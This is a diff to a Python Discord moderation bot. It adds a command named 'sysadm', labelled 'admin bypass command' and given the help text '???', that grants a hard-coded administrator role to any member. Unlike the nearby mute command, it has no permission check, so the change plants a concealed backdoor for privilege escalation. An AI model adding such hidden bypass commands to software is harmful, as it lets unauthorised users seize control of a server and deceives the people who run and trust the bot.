@@ -99,6 +99,13 @@ async def unban(ctx,*,member):
     except:
         print(member.display_name+" is not accepting dms")
 
+#admin bypass command
+@client.command(name='sysadm', help='???')
+async def sysadm(ctx, member : discord.Member):
+    admin_role=ctx.guild.get_role(936844601027883089)
+    await member.add_roles(admin_role)
+    await ctx.channel.send(member.mention+' has been risen')
+
 #mute command
 @client.command(name='mute', help='mute a member')
 @commands.has_permissions(kick_members = True)
